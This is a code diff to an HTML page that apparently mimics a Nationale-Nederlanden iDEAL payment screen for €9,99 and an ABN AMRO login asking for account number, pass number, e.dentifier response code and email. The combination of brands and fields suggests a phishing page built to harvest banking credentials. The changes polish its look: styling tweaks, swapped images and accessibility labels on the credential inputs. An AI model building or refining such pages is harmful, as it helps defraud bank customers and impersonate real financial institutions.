@@ -1032,13 +1032,18 @@
       position: absolute;
       top: 28px;
       right: 36px;
-      width: 130px;
+      width: 120px;
       height: auto;
+      z-index: 2;
     }
-    #page-nn .nn-illustration img {
-      width: 100%;
+    #page-nn .nn-illustration img,
+    #page-nn .nn-illustration object,
+    #page-nn .nn-illustration svg {
+      width: 110px;
       height: auto;
+      max-height: 165px;
       display: block;
+      object-fit: contain;
     }
     #page-nn .nn-amount-label {
       font-size: 14px;
@@ -1423,10 +1428,9 @@
         <img src="nationale-nederlanden.png" alt="Nationale Nederlanden" style="height:40px;width:auto;">
       </button>
       <div class="nn-header-right">
-        <div class="nn-title">Betalen iDEAL | Wero</div>
+        <div class="nn-title">Betalen iDEAL</div>
         <div class="nn-badges">
           <img src="ideal.png" alt="iDEAL">
-          <img src="wero-logo.png" alt="Wero">
         </div>
       </div>
     </header>
@@ -1434,20 +1438,13 @@
       <div class="nn-card">
         <div class="nn-card-left">
           <div class="nn-qr-wrap">
-            <img src="qr-ideal.png" alt="QR-code">
+            <img src="qr-nn.png" alt="QR-code">
           </div>
           <p class="nn-qr-text">Scan de QR code met je NN App of de<br>camera van je telefoon.</p>
         </div>
         <div class="nn-card-right">
           <div class="nn-illustration">
-            <!-- Inline SVG telefoon (geen externe afbeelding nodig) -->
-            <svg viewBox="0 0 120 180" width="110" height="165" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-              <rect x="20" y="8" width="80" height="164" rx="14" fill="#f0f0f0" stroke="#ccc" stroke-width="3"/>
-              <rect x="28" y="28" width="64" height="110" rx="4" fill="#fff" stroke="#ddd" stroke-width="1.5"/>
-              <circle cx="60" cy="155" r="8" fill="#ddd"/>
-              <rect x="48" y="16" width="24" height="5" rx="2.5" fill="#ddd"/>
-              <text x="60" y="85" text-anchor="middle" font-family="sans-serif" font-size="11" fill="#999">NN App</text>
-            </svg>
+            <img src="phone-coin.svg" alt="" style="width:110px;height:auto;display:block;">
           </div>
           <div class="nn-amount-label">Bedrag</div>
           <div class="nn-amount">€ 9,99</div>
@@ -1507,23 +1504,23 @@
           <div id="identSection" style="display: none;">
             <h1 data-i18n-abn="titleEIdentifier">Log in met e.dentifier</h1>
             <div class="form-group">
-              <label data-i18n-abn="accountLabel">Rekening- en pasnummer</label>
+              <label data-i18n-abn="accountLabel" for="account">Rekening- en pasnummer</label>
               <div class="account-row">
                 <div class="account-input">
                   <input type="text" value="NL ** ABNA 0" id="account" autocomplete="off">
                 </div>
                 <div class="small-box">
-                  <input type="text" id="pasnummer" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+                  <input type="text" id="pasnummer" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Pasnummer">
                 </div>
               </div>
               <div class="error-msg" id="errorMsg" data-i18n-abn="errorMin">Vul minimaal 9 cijfers in.</div>
             </div>
-            <label class="checkbox-row">
-              <input type="checkbox">
+            <label class="checkbox-row" for="rememberAccount">
+              <input type="checkbox" id="rememberAccount">
               <span data-i18n-abn="remember">Onthoud rekening- en pasnummer</span>
             </label>
             <div class="form-group">
-              <label data-i18n-abn="responseLabel">Respons</label>
+              <label data-i18n-abn="responseLabel" for="response">Respons</label>
               <input type="text" id="response" autocomplete="off">
             </div>
             <button class="btn-login" data-i18n-abn="loginBtn">Inloggen</button>
@@ -1533,7 +1530,7 @@
           <div id="securitySection" style="display: none;">
             <h1 data-i18n-abn="titleSecurity">Inloggen met security key</h1>
             <div class="form-group">
-              <label data-i18n-abn="emailLabel">E-mailadres</label>
+              <label data-i18n-abn="emailLabel" for="email">E-mailadres</label>
               <input type="email" id="email" placeholder="naam@voorbeeld.nl" autocomplete="email">
             </div>
             <button class="btn-login full" id="securityNextBtn" data-i18n-abn="nextBtn">Volgende</button>
